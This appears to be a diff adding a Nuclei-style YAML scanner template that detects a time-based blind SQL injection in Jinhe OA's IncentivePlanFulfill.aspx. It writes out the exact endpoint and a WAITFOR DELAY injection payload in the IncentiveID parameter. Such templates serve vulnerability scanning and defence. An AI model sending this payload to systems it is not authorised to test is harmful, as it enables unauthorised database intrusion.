@@ -1,0 +1,46 @@
+id: jinhe-oa-incentiveplanfulfill-sqli
+
+info:
+  name: 金和OA IncentivePlanFulfill.aspx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(1, 5)}}"
+  t2: "{{to_number(t1) + 1}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: check-login-page
+    method: GET
+    path:
+      - "{{BaseURL}}/c6/Jhsoft.Web.login/PassWordNew.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "JHSoft"
+
+  - id: check-sqli
+    method: GET
+    path:
+      - "{{BaseURL}}/C6/JHSoft.Web.IncentivePlan/IncentivePlanFulfill.aspx/?IncentiveID=1WAITFOR+DELAY+%270:0:{{t1}}%27--&TVersion=1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ""
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
